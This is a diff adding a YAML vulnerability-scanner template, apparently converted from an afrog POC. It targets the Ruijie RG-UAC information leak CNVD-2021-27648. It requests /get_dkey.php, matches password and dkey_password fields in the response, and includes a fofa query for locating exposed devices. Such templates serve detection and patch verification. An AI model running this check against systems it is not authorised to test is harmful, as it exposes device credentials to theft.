@@ -1,0 +1,31 @@
+# 来源: afrog（转换自 afrog/xray 表达式 POC）
+http:
+  - matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '"password":'
+          - '"pre_define":'
+          - '"auth_method":'
+          - '"dkey_password":'
+        condition: and
+    method: GET
+    path:
+      - '{{BaseURL}}/get_dkey.php'
+id: CNVD-2021-27648
+info:
+  author: doinb1517
+  description: |-
+    锐捷RG-UAC锐捷统一上网行为管理与审计系统存在信息泄露漏洞，攻击者可利用该漏洞获取敏感信息。
+    fofa: title="RG-UAC登录页面"
+  metadata:
+    argus-execution-class: detection
+    argus-import-license: MIT License
+    argus-import-source: afrog
+    argus-risk-level: high
+  name: Ruijie RG-UAC Information Leakage Vulnerability
+  severity: critical
+  tags: cnvd,cnvd2021,ruijie,leakage,argus-import
